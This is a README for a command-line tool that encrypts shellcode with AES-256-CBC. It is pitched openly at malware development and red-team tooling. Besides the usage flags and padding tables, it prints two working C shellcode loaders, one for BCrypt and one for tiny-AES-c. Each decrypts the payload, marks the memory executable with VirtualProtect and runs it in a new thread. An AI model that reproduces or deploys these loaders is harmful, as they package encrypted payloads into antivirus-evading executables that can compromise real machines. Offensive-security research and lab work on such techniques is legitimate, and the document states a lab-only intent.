# AES-Encryptor

> AES-256-CBC shellcode encryptor with multiple output formats, roundtrip verification, and entropy analysis.

A command-line tool for encrypting shellcode using AES-256-CBC. Outputs ready-to-paste C arrays compatible with both the Windows BCrypt (CNG) API and the [tiny-AES-c](https://github.com/kokke/tiny-AES-c) library. Designed for malware development research, red team tooling, and offensive security labs.

---

## Features

- **AES-256-CBC encryption** — industry standard, hardware-accelerated on modern CPUs
- **Multiple output formats** — BCrypt (PKCS7), tiny-AES-c (zero-pad), Python bytes, raw binary
- **Automatic roundtrip verification** — decrypts immediately after encrypting and compares to original
- **Entropy analysis** — reports Shannon entropy on both plaintext and ciphertext
- **Verbose mode** (`-v`) — hex dumps, hashes, entropy, per-step debug output
- **Flexible input** — raw binary file, hex string, or built-in test shellcode
- **BYO key material** — optionally supply your own key and IV via hex flags
- **Raw binary output** — writes ciphertext as `.bin` with a `.keymeta` sidecar (key, IV, size)
- **Clean output** — `--no-color`, `--no-banner` flags for piping and scripting
- **Strong error handling** — validates hex input, file size, key lengths, block alignment

## Usage

```
usage: aes_encryptor.py [-h] [-f FILE | -s HEX] [--key HEX] [--iv HEX]
                        [-o FILE] [--format {bcrypt,tinyaes,both,raw,python}]
                        [--list-formats] [-v] [--no-color] [--no-banner]
                        [--no-verify]
```

### Basic

```bash
# Encrypt a raw shellcode binary
python3 aes_encryptor.py -f shellcode.bin

# Encrypt from a hex string
python3 aes_encryptor.py -s "fc4883e4f0e8c0000000..."

# Built-in test shellcode (calc.exe x64) — no args needed
python3 aes_encryptor.py
```

### Output Formats

```bash
# BCrypt WinAPI loader (default)
python3 aes_encryptor.py -f shellcode.bin --format bcrypt

# tiny-AES-c loader
python3 aes_encryptor.py -f shellcode.bin --format tinyaes

# Both loaders in one file
python3 aes_encryptor.py -f shellcode.bin --format both

# Python bytes literal (for use in another script)
python3 aes_encryptor.py -f shellcode.bin --format python

# Raw binary ciphertext + .keymeta sidecar
python3 aes_encryptor.py -f shellcode.bin --format raw -o shellcode_enc.bin
```

### Write to File

```bash
python3 aes_encryptor.py -f shellcode.bin -o output.c
```

### Verbose Mode

```bash
python3 aes_encryptor.py -f shellcode.bin -v
```

Verbose output includes:
- SHA-256 and MD5 of plaintext
- Hex dump of plaintext, key, IV, ciphertext (first 64 bytes)
- Shannon entropy of plaintext and ciphertext
- Per-step debug messages
- Roundtrip verification result

### Custom Key / IV

```bash
python3 aes_encryptor.py -f shellcode.bin \
  --key 3e31f40050b66eb8f6989527...  \
  --iv  b4c81d1d147ccbfa0742d9ed...
```

Key must be 32 bytes (64 hex chars). IV must be 16 bytes (32 hex chars).

### List Formats

```bash
python3 aes_encryptor.py --list-formats
```

## Loader Compatibility

### BCrypt (Windows CNG)

The `bcrypt` format outputs PKCS7-padded ciphertext. Use with a loader built around `BCryptDecrypt` / `BCryptOpenAlgorithmProvider`:

```c
// Paste pKey[], pIv[], CipherText[] from tool output

PVOID pPlaintext = NULL;
DWORD dwPlainSize = 0;

SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlaintext, &dwPlainSize);

PVOID pExec = VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(pExec, pPlaintext, SHELLCODE_SIZE);

DWORD dwOld = 0;
VirtualProtect(pExec, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &dwOld);

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

### tiny-AES-c

The `tinyaes` format outputs zero-padded ciphertext. Use with loaders built around `AES_CBC_decrypt_buffer`:

```c
// Paste pKey[], pIv[], CipherText[] from tool output

struct AES_ctx ctx;
AES_init_ctx_iv(&ctx, pKey, pIv);
AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));

// CipherText now holds decrypted shellcode (in-place)
PVOID pExec = VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(pExec, CipherText, SHELLCODE_SIZE);

DWORD dwOld = 0;
VirtualProtect(pExec, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &dwOld);

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

> **Note:** tiny-AES-c decrypts **in-place** — the `CipherText` buffer is overwritten with plaintext. Always `memcpy` only `SHELLCODE_SIZE` bytes (not `sizeof(CipherText)`) to avoid executing zero-padding.

## Padding Reference

| Library   | Padding | Ciphertext size formula              |
|-----------|---------|--------------------------------------|
| BCrypt    | PKCS7   | `ceil(n / 16) * 16` always adds pad  |
| tiny-AES  | Zero    | `n + (16 - n % 16)` if not aligned   |

Both produce ciphertext that is a multiple of 16 bytes. The `#define SHELLCODE_SIZE` in the output tells your loader exactly how many bytes to copy/execute after decryption, stripping the padding.

## Flags Reference

| Flag | Description |
|------|-------------|
| `-f FILE` | Raw shellcode binary input |
| `-s HEX` | Hex string input |
| `--key HEX` | Use a specific 32-byte key (64 hex chars) |
| `--iv HEX` | Use a specific 16-byte IV (32 hex chars) |
| `-o FILE` | Write output to file instead of stdout |
| `--format` | `bcrypt` \| `tinyaes` \| `both` \| `raw` \| `python` |
| `--list-formats` | Print format descriptions and exit |
| `-v` | Verbose: hex dumps, entropy, hashes, debug |
| `--no-color` | Disable ANSI colour (for piping/logging) |
| `--no-banner` | Suppress ASCII art banner |
| `--no-verify` | Skip roundtrip decryption check |

## Security Notes

- Keys and IVs are generated using `os.urandom()` — a CSPRNG, not `rand()`.
- Keys and IVs are **never written to disk** unless `--format raw` is used (`.keymeta` sidecar).
- This tool does not execute any shellcode — it only encrypts.
- Designed for use in controlled lab environments and authorized engagements only.
